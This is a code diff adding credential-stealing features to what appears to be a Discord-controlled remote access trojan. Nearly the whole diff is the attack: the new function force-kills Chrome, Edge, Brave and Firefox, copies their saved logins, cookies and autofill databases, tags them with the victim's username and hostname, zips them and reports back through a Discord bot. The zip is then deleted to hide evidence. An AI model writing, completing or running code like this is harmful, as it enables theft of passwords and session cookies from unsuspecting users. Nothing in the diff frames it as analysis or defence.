+                        await message.channel.send(f"[*] Browser data: {data}")
+                    
+                    # Clean up the zip file to avoid leaving evidence
+                    try:
+                        os.remove(zip_path)
+                    except:
+                        pass
+                else:
+                    await message.channel.send(f"[!] Failed to retrieve browser data: {data}")
+            else:
+                # Use the external stealer component
+                await message.channel.send("[*] Using external stealer component...")
+                result = await steal_user_info()
+                await message.channel.send(f"[*] {result}")
+                
+        except Exception as e:
+            await message.channel.send(f"[!] Error during data theft operation: {str(e)}")
+
+async def steal_browser_data():
+    try:
+        temp_dir = os.path.join(os.environ['TEMP'], ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)))
+        await asyncio.to_thread(os.makedirs, temp_dir, exist_ok=True)
+        
+        browsers = {
+            'chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
+            'edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
+            'brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
+            'firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
+        }
+        
+        stolen_data = {}
+        max_browser_processing_time = 30  # Maximum seconds to spend on each browser
+        
+        for browser_name, browser_path in browsers.items():
+            # Skip non-existent browser paths
+            if not await asyncio.to_thread(os.path.exists, browser_path):
+                continue
+                
+            stolen_data[browser_name] = {}
+            browser_start_time = time.time()
+            
+            if browser_name in ['chrome', 'edge', 'brave']:
+                # Find profiles for Chrome-based browsers
+                profiles = []
+                try:
+                    if await asyncio.to_thread(os.path.exists, browser_path):
+                        items = await asyncio.to_thread(os.listdir, browser_path)
+                        for item in items:
+                            if item.startswith('Profile ') or item == 'Default':
+                                profiles.append(item)
+                except Exception as e:
+                    stolen_data[browser_name]["error"] = f"Error listing profiles: {str(e)}"
+                    continue
+                
+                # Cap number of profiles to avoid processing too many
+                if len(profiles) > 5:
+                    profiles = profiles[:5]  # Only process first 5 profiles
+                
+                for profile in profiles:
+                    # Check time spent on this browser to avoid getting stuck
+                    if time.time() - browser_start_time > max_browser_processing_time:
+                        stolen_data[browser_name]["timeout"] = "Browser processing timed out"
+                        break
+                        
+                    profile_path = os.path.join(browser_path, profile)
+                    
+                    # Process login data (credentials)
+                    login_db = os.path.join(profile_path, 'Login Data')
+                    if await asyncio.to_thread(os.path.exists, login_db):
+                        login_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_logins.db")
+                        try:
+                            # Kill browser process to unlock database files
+                            await asyncio.to_thread(subprocess.run, 
+                                               ['taskkill', '/F', '/IM', f"{browser_name}.exe"], 
+                                               shell=True, 
+                                               stdout=subprocess.DEVNULL,
+                                               stderr=subprocess.DEVNULL,
+                                               check=False,
+                                               timeout=5)  # Add timeout to avoid hanging
+                            await asyncio.sleep(0.5)
+                            
+                            # Copy the file with timeout protection
+                            try:
+                                await asyncio.wait_for(
+                                    asyncio.to_thread(shutil.copy2, login_db, login_copy),
+                                    timeout=5
+                                )
+                                stolen_data[browser_name][f"{profile}_logins"] = "Extracted"
+                            except asyncio.TimeoutError:
+                                stolen_data[browser_name][f"{profile}_logins"] = "Timeout during copy"
+                        except Exception as e:
+                            stolen_data[browser_name][f"{profile}_logins"] = f"Failed: {str(e)}"
+                    
+                    # Process cookies
+                    cookies_db = os.path.join(profile_path, 'Network', 'Cookies')
+                    if await asyncio.to_thread(os.path.exists, cookies_db):
+                        cookies_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_cookies.db")
+                        try:
+                            # Copy the file with timeout protection
+                            try:
+                                await asyncio.wait_for(
+                                    asyncio.to_thread(shutil.copy2, cookies_db, cookies_copy),
+                                    timeout=5
+                                )
+                                stolen_data[browser_name][f"{profile}_cookies"] = "Extracted"
+                            except asyncio.TimeoutError:
+                                stolen_data[browser_name][f"{profile}_cookies"] = "Timeout during copy"
+                        except Exception as e:
+                            stolen_data[browser_name][f"{profile}_cookies"] = f"Failed: {str(e)}"
+                            
+                    # Process web data (autofill)
+                    webdata_db = os.path.join(profile_path, 'Web Data')
+                    if await asyncio.to_thread(os.path.exists, webdata_db):
+                        webdata_copy = os.path.join(temp_dir, f"{browser_name}_{profile}_webdata.db")
+                        try:
+                            # Copy the file with timeout protection
+                            try:
+                                await asyncio.wait_for(
+                                    asyncio.to_thread(shutil.copy2, webdata_db, webdata_copy),
+                                    timeout=5
+                                )
+                                stolen_data[browser_name][f"{profile}_autofill"] = "Extracted"
+                            except asyncio.TimeoutError:
+                                stolen_data[browser_name][f"{profile}_autofill"] = "Timeout during copy"
+                        except Exception as e:
+                            stolen_data[browser_name][f"{profile}_autofill"] = f"Failed: {str(e)}"
+            
+            # Process Firefox
+            elif browser_name == 'firefox' and await asyncio.to_thread(os.path.exists, browser_path):
+                try:
+                    items = await asyncio.to_thread(os.listdir, browser_path)
+                    firefox_processed = False
+                    
+                    for item in items:
+                        # Check time spent on this browser to avoid getting stuck
+                        if time.time() - browser_start_time > max_browser_processing_time:
+                            stolen_data[browser_name]["timeout"] = "Browser processing timed out"
+                            break
+                            
+                        item_path = os.path.join(browser_path, item)
+                        if (await asyncio.to_thread(os.path.isdir, item_path) and 
+                            ('.default' in item or 'default-release' in item)):
+                            profile_path = item_path
+                            
+                            # Kill Firefox to unlock files
+                            await asyncio.to_thread(subprocess.run, 
+                                               ['taskkill', '/F', '/IM', 'firefox.exe'], 
+                                               shell=True, 
+                                               stdout=subprocess.DEVNULL,
+                                               stderr=subprocess.DEVNULL,
+                                               check=False,
+                                               timeout=5)
+                            await asyncio.sleep(0.5)
+                            
+                            # Process cookies
+                            cookies_file = os.path.join(profile_path, 'cookies.sqlite')
+                            if await asyncio.to_thread(os.path.exists, cookies_file):
+                                cookies_copy = os.path.join(temp_dir, "firefox_cookies.sqlite")
+                                try:
+                                    # Copy with timeout protection
+                                    try:
+                                        await asyncio.wait_for(
+                                            asyncio.to_thread(shutil.copy2, cookies_file, cookies_copy),
+                                            timeout=5
+                                        )
+                                        stolen_data[browser_name]["cookies"] = "Extracted"
+                                    except asyncio.TimeoutError:
+                                        stolen_data[browser_name]["cookies"] = "Timeout during copy"
+                                except Exception:
+                                    stolen_data[browser_name]["cookies"] = "Failed"
+                            
+                            # Process logins
+                            logins_file = os.path.join(profile_path, 'logins.json')
+                            if await asyncio.to_thread(os.path.exists, logins_file):
+                                logins_copy = os.path.join(temp_dir, "firefox_logins.json")
+                                try:
+                                    # Copy with timeout protection
+                                    try:
+                                        await asyncio.wait_for(
+                                            asyncio.to_thread(shutil.copy2, logins_file, logins_copy),
+                                            timeout=5
+                                        )
+                                        stolen_data[browser_name]["logins"] = "Extracted"
+                                    except asyncio.TimeoutError:
+                                        stolen_data[browser_name]["logins"] = "Timeout during copy"
+                                except Exception:
+                                    stolen_data[browser_name]["logins"] = "Failed"
+                                    
+                            firefox_processed = True
+                            break  # Only process one Firefox profile
+                    
+                    if not firefox_processed:
+                        stolen_data[browser_name]["error"] = "No suitable Firefox profile found"
+                except Exception as e:
+                    stolen_data[browser_name]["error"] = f"Error processing Firefox: {str(e)}"
+        
+        # Calculate summary statistics
+        stolen_data_count = 0
+        for browser in stolen_data:
+            for key in stolen_data[browser]:
+                if stolen_data[browser][key] == "Extracted":
+                    stolen_data_count += 1
+        
+        stolen_data["summary"] = {
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "total_items": stolen_data_count,
+            "user": os.getlogin(),
+            "hostname": socket.gethostname()
+        }
+        
+        # Create zip file with all stolen data
+        zip_path = os.path.join(os.environ['TEMP'], f"browser_data_{random.randint(1000, 9999)}.zip")
+        try:
+            await asyncio.wait_for(
+                asyncio.to_thread(create_zip, temp_dir, zip_path),
+                timeout=30  # Max 30 seconds for zip creation
+            )
+        except asyncio.TimeoutError:
+            return None, "Timeout while creating zip file"
+        
+        # Clean up temp directory
+        try:
+            await asyncio.wait_for(
+                asyncio.to_thread(shutil.rmtree, temp_dir, ignore_errors=True),
+                timeout=5
+            )
+        except:
+            pass
+            
+        return zip_path, json.dumps(stolen_data, indent=2)
+        
+    except Exception as e:
+        return None, str(e)
+
+def create_zip(source_dir, zip_path):
+    with ZipFile(zip_path, 'w') as zipf:
+        for root, dirs, files in os.walk(source_dir):
+            for file in files:
+                file_path = os.path.join(root, file)
+                zipf.write(file_path, os.path.relpath(file_path, source_dir))
+
 try:
-    import base64
-    encoded_token = base64.b64encode(token.encode()).decode()
-    decoded_token = base64.b64decode(encoded_token.encode()).decode()
-    client.run(token)
+    # Start Discord client with token
+    if token:
+        print("Starting Discord client...")
+        client.run(token)
+    else:
+        print("Error: No token provided. Please rebuild with a valid Discord bot token.")
 except Exception as e:
     print(f"Error running client: {str(e)}")
     try:
-        client.run(decoded_token)
-    except:
-        try:
+        # Try with base64 encoded token
+        if token:
+            encoded_token = base64.b64encode(token.encode()).decode()
+            print("Trying with encoded token...")
             client.run(encoded_token)
+    except Exception as e2:
+        print(f"Error with encoded token: {str(e2)}")
+        try:
+            # Try with decoded token as last resort
+            if token:
+                try:
+                    # First check if token might already be base64 encoded
+                    decoded_token = base64.b64decode(token.encode()).decode()
+                    print("Trying with decoded token...")
+                    client.run(decoded_token)
+                except:
+                    print("Failed to connect with all token methods.")
         except:
-            pass
+            print("Failed to connect with any token method. Check your Discord bot token.")
